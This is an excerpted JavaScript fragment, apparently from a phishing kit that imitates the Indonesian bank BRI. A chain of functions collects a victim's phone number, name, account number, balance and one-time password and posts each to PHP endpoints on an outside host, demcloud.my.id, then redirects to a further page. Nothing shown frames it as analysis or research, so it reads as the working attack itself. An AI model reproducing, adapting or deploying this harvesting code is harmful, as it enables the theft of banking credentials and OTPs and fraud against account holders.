...
function sendNohp(){    
  ...
  sessionStorage.setItem('nomor', nomor);                     
       ...
       $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BRI/tds59/no.php',
...
function sendLogin(){
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
     ...
     $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BRI/tds59/login.php',
...
function sendSaldo(){
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo) {      
       ...
       $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BRI/tds59/saldo.php',
...
function sendOtp(){
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
     ...
     $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BRI/tds59/otp.php',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/BRI/tds59/wa';
    }, 5000);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 5100);      
